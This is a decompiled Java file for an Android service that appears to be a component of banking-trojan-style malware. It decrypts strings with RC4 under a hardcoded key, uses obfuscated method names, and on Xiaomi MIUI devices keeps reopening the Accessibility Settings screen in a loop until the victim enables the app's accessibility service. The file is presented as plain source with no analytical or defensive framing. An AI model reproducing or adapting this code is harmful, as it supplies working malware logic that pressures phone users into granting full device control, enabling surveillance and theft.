package com.example.mmm.unused;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvWhileWorker;
import com.example.mmm.Utils.utils;
import com.example.mmm.Utils.utils2;

public class UnusedService extends Service {
   utils template$;
   utils2 comic$;
   constants calling$;
   private String updated$;

   public UnusedService() {
      StringBuilder var1 = new StringBuilder();
      var1.append(srvWhileWorker.class.getSimpleName());
      var1.append("   ");
      this.updated$ = var1.toString();
      this.template$ = new utils();
      this.comic$ = new utils2();
      this.calling$ = new constants();
   }

   private String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   public IBinder onBind(Intent var1) {
      throw new UnsupportedOperationException("Not yet implemented");
   }

   public int onStartCommand(Intent var1, int var2, int var3) {
      if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10) {
         while(!utils.isAccessibilityServiceEnabled(this, srvAccessibility.class) || !this.template$.SettingsRead(this, "XB").equals("1")) {
            utils.chalkTile(1000);
            if (utils.isAccessibilityServiceEnabled(this, srvAccessibility.class)) {
               this.comic$._cornell(this);
            } else {
               this.startActivity((new Intent("android.settings.ACCESSIBILITY_SETTINGS")).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
            }
         }
      }

      return var2;
   }
}
